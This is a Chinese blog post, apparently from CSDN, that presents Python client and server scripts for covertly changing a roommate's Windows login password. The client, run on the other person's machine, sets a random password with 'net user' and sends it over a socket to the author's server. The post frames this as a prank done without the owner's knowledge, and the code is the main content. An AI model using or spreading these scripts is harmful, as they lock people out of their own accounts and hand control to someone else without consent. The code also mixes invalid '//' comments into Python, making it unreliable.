
--- 
title:  用 Python 控制了室友电脑的开机密码 
tags: []
categories: [] 

---
<img src="https://img-blog.csdnimg.cn/img_convert/18705f5159af26a77f49ec1ee876b934.png">

今天教大家用Python脚本来控制小伙伴们Windows电脑的开机密码。没错就是神不知鬼不觉，用random()随机生成的密码，只有你自己知道哦~

代码分两部分：client端和server端。

**操作方法：**在自己的电脑上运行server端，然后在小伙伴的电脑上运行client端脚本。

**原理：**client端会在你的小伙伴电脑上随机生成一个密码然后通过socket发给server端，也就是你。

<img src="https://img-blog.csdnimg.cn/img_convert/36b3b3cf0264725f8a78ece43962c11e.png" width="69%">

**代码如下：**

client端代码：

```
# client.py：//文件名
import socket //导入用到的模块
import getpass
import subprocess
import random

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) //创建socket实例
client.connect(('10.0.0.1', 44444)) //连接server端IP地址/端口按你自己实际情况来
user = getpass.getuser() //获取计算机用户名
psd = '' //给一个psd变量（密码）为空
for j in range(1, 9): //生成1-9的随机数
m = str(random.randrange(0, 10))
psd = psd + m
subprocess.Popen(['net', 'User', user, psd]) //在本地执行（类似于cmd命令）
client.send(psd.encode('utf-8')) //将密码发送给server端
back_msg = client.recv(1024)
client.close() //关闭socket
print psd //避免出现差错忘记密码 先在本地打印

```

server端代码：

```
# server.py //文件名
import socket //导入socket

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) //创建socket
server.bind(('10.0.0.1', 44444)) //绑定IP/端口
server.listen(5) //监听
print('starting....')
conn, addr = server.accept() //连接
print(conn)
print('client addr', addr)
print('ready to recv the passwd...')
client_msg = conn.recv(1024)
print('client passwd changed: %s' % client_msg)
conn.send(client_msg.upper())
conn.close()
server.close()

```

**运行程序：**

推荐在虚拟机下运行，万一出个差错搞不好真忘记密码！切记切记~

首先先在我的Linux上运行server端，来等待接收来自client端传过来的密码。

<img src="https://img-blog.csdnimg.cn/img_convert/69f765cf61c80c6b89116d8c5335dbef.png" width="69%">

运行server.py脚本

然后windows运行client端，它会显示生成的密码

前提是在cmd命令行下运行否则你双击一下会消失

<img src="https://img-blog.csdnimg.cn/img_convert/f265af3bd3cd04bf47edb68f539c164d.png" width="69%">

cmd下运行

现在再注销或者是重启输入原始密码就会发现密码错误，密码也已经发到我们的server端了。

<img src="https://img-blog.csdnimg.cn/img_convert/0bf14378caf30dd413756619f54cc164.png" width="69%">

server收到密码

如果你现在想改回密码的话，打开cmd输入“net user 你的用户名 你要改变的密码” 然后回车就ok了。

<img src="https://img-blog.csdnimg.cn/img_convert/9ac734c062d2d4b29515778c336c96ed.png" width="69%">

&lt; END &gt;

<img src="https://img-blog.csdnimg.cn/img_convert/3c05b78d1b823fa30a14cb788525c0e0.gif">

微信扫码关注，了解更多内容
